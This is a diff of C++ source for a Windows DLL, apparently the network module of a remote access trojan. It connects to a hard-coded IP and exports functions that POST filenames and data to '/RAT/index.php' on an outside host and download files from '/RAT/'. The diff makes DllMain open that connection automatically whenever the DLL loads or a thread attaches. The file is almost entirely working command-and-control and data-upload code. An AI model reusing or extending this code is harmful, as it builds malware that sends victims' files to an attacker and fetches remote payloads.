@@ -1,34 +1,29 @@
-//cl /EHsc /LD .\network_lib.cpp /link User32.lib
 #include <iostream>
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
-#include <sstream>
 #include <mutex>
 #include <vector>
 
-#pragma comment(lib, "ws2_32.lib")
+SOCKET clientSocket = INVALID_SOCKET;
+std::mutex socketMutex;
 
-SOCKET clientSocket;
-std::mutex socketMutex; 
-
-int safe_closesocket(SOCKET &clientSocket)
+int safe_closesocket()
 {
+    std::lock_guard<std::mutex> lock(socketMutex);
     if (clientSocket != INVALID_SOCKET)
     {
         shutdown(clientSocket, SD_BOTH);
         closesocket(clientSocket);
-
         clientSocket = INVALID_SOCKET;
         return 0;
     }
-    else return 1;
+    return 1;
 }
 
-int socket_setup(SOCKET &clientSocket)
+int socket_setup()
 {
-    bool connected = false;
-
+    std::lock_guard<std::mutex> lock(socketMutex);
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
@@ -39,7 +34,7 @@ int socket_setup(SOCKET &clientSocket)
     clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (clientSocket == INVALID_SOCKET)
     {
-        std::cerr << "socket failed.\n";
+        std::cerr << "Socket creation failed.\n";
         WSACleanup();
         return 0;
     }
@@ -49,163 +44,138 @@ int socket_setup(SOCKET &clientSocket)
     serverAddr.sin_port = htons(80);
     serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
 
-    while (!connected)
+    while (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
     {
-        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            if (error != WSAECONNREFUSED)
-            {
-                std::stringstream ss;
-                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
-                std::cerr << ss.str();
-            }   
-            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-            Sleep(2000);
-        }
-        else connected = true;
-
+        int error = WSAGetLastError();
+        if (error != WSAECONNREFUSED)
+            std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
+        else
+            std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+        Sleep(2000);
     }
     return 1;
 }
 
-__declspec(dllexport) int send_data(const std::string& filename , const std::string& data)
+__declspec(dllexport) int send_data(const std::string& filename, const std::string& data)
 {
+    std::lock_guard<std::mutex> lock(socketMutex);
+
+    std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
+                                "Host: arth.imbeddex.com\r\n"
+                                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
+                                "Content-Type: application/octet-stream\r\n"
+                                "Connection: keep-alive\r\n\r\n" +
+                                filename + data;
+    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
+    if (bytesSent == SOCKET_ERROR)
     {
-        std::lock_guard<std::mutex> lock1(socketMutex); 
-        
-        if(!socket_setup(clientSocket)) return 1;
-
-
-        std::stringstream httpRequest;
-        httpRequest << "POST /RAT/index.php HTTP/1.1\r\n"
-                    << "Host: arth.imbeddex.com\r\n"
-                    << "Content-Length: " << (filename.length() + data.length()) << "\r\n"
-                    << "Content-Type: application/octet-stream\r\n"
-                    << "Connection: close\r\n\r\n"
-                    << filename << data;
-
-        std::string requestString = httpRequest.str();
-        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);        
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            std::cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
-            return 1;
-        }
-
-        if(!safe_closesocket(clientSocket)) return 1;
-        return 0;
+        int error = WSAGetLastError();
+        std::cerr << "Send failed with error: " << error << std::endl;
+        return 1;
     }
+    return 0;
 }
 
-__declspec(dllexport) std::string receive_data(const std::string &filename)
+__declspec(dllexport) std::string receive_data(const std::string& filename)
 {
+    std::lock_guard<std::mutex> lock(socketMutex);
+
+    std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
+                                "Host: arth.imbeddex.com\r\n"
+                                "Connection: keep-alive\r\n\r\n";
+    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
+    if (bytesSent == SOCKET_ERROR)
     {
-        std::lock_guard<std::mutex> lock1(socketMutex);
+        int error = WSAGetLastError();
+        std::cerr << "Send failed with error: " << error << std::endl;
+        return "";
+    }
 
-        socket_setup(clientSocket);
+    char buffer[4096];
+    std::string receivedData;
+    int bytesReceived;
 
-        std::string f_name = filename;
-        std::stringstream httpRequest;
-        httpRequest << "GET /RAT/" << f_name << " HTTP/1.1\r\n"
-                    << "Host: arth.imbeddex.com\r\n"
-                    << "Connection: close\r\n\r\n";
-
-        std::string requestString = httpRequest.str();
-        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
+    do {
+        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+        if (bytesReceived > 0)
+        {
+            buffer[bytesReceived] = '\0';
+            receivedData += buffer;
+        }
+        else if (bytesReceived == 0)
+        {
+            //std::cerr << "Connection closed by server." << std::endl;
+            break;
+        }
+        else
         {
             int error = WSAGetLastError();
-            //cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+            if (error != WSAECONNRESET)
+                std::cerr << "Receive failed with error: " << error << std::endl;
+            break;
         }
+    } while (bytesReceived == sizeof(buffer) - 1);
 
-        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        std::string receivedData;
-        int bytesReceived;
-
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
-            if (bytesReceived > 0)
-            {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer;
-            } 
-            else if (bytesReceived == 0)
-            {
-                std::cerr << "Connection closed by server." << std::endl;
-                break;
-            } else
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) std::cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1);
-
-        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        // Robust HTTP response parsing
-        size_t headerEnd = receivedData.find("\r\n\r\n");
-        if (headerEnd == std::string::npos)
-        {
-            std::cerr << "Invalid HTTP receivedData: No header/body separator found." << std::endl;
-            return "";
-        }
-
-        std::string body = receivedData.substr(headerEnd + 4);
-
-        //Handle chunked transfer encoding (if present)
-        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
-        if (transferEncodingPos != std::string::npos)
-        {
-            std::string unchunkedBody;
-            std::istringstream bodyStream(body);
-            std::string chunkLengthStr;
-
-            while (getline(bodyStream, chunkLengthStr))
-            {
-                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
-
-                size_t chunkSize;
-                std::stringstream ss;
-                ss << std::hex << chunkLengthStr;
-                ss >> chunkSize;
-
-                if (chunkSize == 0) break; // End of chunked data
-
-                std::string chunkData(chunkSize, '\0');
-                bodyStream.read(&chunkData[0], chunkSize);
-
-                unchunkedBody += chunkData;
-                bodyStream.ignore(2); // Consume CRLF after chunk
-            }
-            body = unchunkedBody;
-        }
-
-        safe_closesocket(clientSocket);
-        return body;
+    size_t headerEnd = receivedData.find("\r\n\r\n");
+    if (headerEnd == std::string::npos)
+    {
+        std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
+        return "";
     }
+
+    std::string body = receivedData.substr(headerEnd + 4);
+
+    size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
+    if (transferEncodingPos != std::string::npos)
+    {
+        std::string unchunkedBody;
+        const char* ptr = body.c_str();
+        const char* end = ptr + body.length();
+
+        while (ptr < end)
+        {
+            while (ptr < end && (*ptr == ' ' || *ptr == '\r' || *ptr == '\n'))
+                ptr++;
+
+            if (ptr >= end) break;
+
+            size_t chunkSize = 0;
+            while (ptr < end && isxdigit(*ptr))
+            {
+                chunkSize *= 16;
+                chunkSize += isdigit(*ptr) ? *ptr - '0' : (tolower(*ptr) - 'a' + 10);
+                ptr++;
+            }
+
+            while (ptr < end && (*ptr == '\r' || *ptr == '\n')) ptr++;
+
+            if (chunkSize == 0) break;
+            if (ptr + chunkSize > end) break;
+
+            unchunkedBody.append(ptr, chunkSize);
+            ptr += chunkSize;
+        }
+        body = unchunkedBody;
+    }
+
+    return body;
 }
 
 __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
 {
-    std::lock_guard<std::mutex> lock1(socketMutex);
+    std::lock_guard<std::mutex> lock(socketMutex);
 
-    socket_setup(clientSocket);
 
     // Send HTTP GET request
     std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
+    httpRequest += "Connection: keep-alive\r\n\r\n";
 
     int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
     if (bytesSent == SOCKET_ERROR)
     {
         int error = WSAGetLastError();
-        std::cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
+        std::cerr << "Send failed with error: " << error << std::endl;
         throw std::runtime_error("Send failed");
     }
 
@@ -214,7 +184,7 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
     std::vector<unsigned char> receivedData;
     int bytesReceived;
 
-    do {
+    while (true) {
         bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
         if (bytesReceived > 0) {
             receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
@@ -226,7 +196,7 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
             std::cerr << "Receive failed with error: " << error << std::endl;
             break;
         }
-    } while (bytesReceived > 0);
+    }
 
     // Ensure header separator is found
     size_t headerEnd = 0;
@@ -235,41 +205,39 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
     // Search for header separator (CRLF + CRLF)
     for (size_t i = 0; i < receivedData.size() - 3; ++i)
     {
-        if (receivedData[i] == CRLF[0] &&
-            receivedData[i + 1] == CRLF[1] &&
-            receivedData[i + 2] == CRLF[2] &&
-            receivedData[i + 3] == CRLF[3])
+        if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
         {
             headerEnd = i + 4; // Found header, skip the separator
             break;
         }
     }
 
-    if (headerEnd != 0)
+    if (headerEnd != 0) 
     {
         //cout << "Header found at position: " << headerEnd << std::endl;
     }
     else
     {
         std::cerr << "Header separator not found." << std::endl;
-        throw std::runtime_error("Header separator not found");
+        receivedData.clear();
+        return std::vector<unsigned char>();
     }
 
     // Make sure headerEnd + 4 is within the bounds of the receivedData
-    if (headerEnd < receivedData.size())
+    if (headerEnd <= receivedData.size())
     {
         // Extract body after header (start from headerEnd)
         std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
-        safe_closesocket(clientSocket); // Close the socket safely
 
         return body; // Return the extracted body
     }
-    else
-    {
+    else {
         std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
-        safe_closesocket(clientSocket); // Close the socket safely
-        throw std::runtime_error("Body extraction failed");
+        receivedData.clear();
+        return std::vector<unsigned char>();
     }
+    
+    return std::vector<unsigned char>();
 }
 
 BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
@@ -277,26 +245,19 @@ BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpRese
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
-        {
-            //MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION); 
+            socket_setup();
             break;
-        }
         case DLL_PROCESS_DETACH:
-        {
-            //MessageBoxA(NULL, "DLL_PROCESS_DETACH" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+            safe_closesocket();
             WSACleanup();
             break;
-        }
         case DLL_THREAD_ATTACH:
-        {
-            //MessageBoxA(NULL, "DLL_THREAD_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+            socket_setup();
             break;
-        }
         case DLL_THREAD_DETACH:
-        {
-            //MessageBoxA(NULL, "DLL_THREAD_DETACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+            safe_closesocket();
+            WSACleanup();
             break;
-        }
-    }    
+    }
     return TRUE;
 }
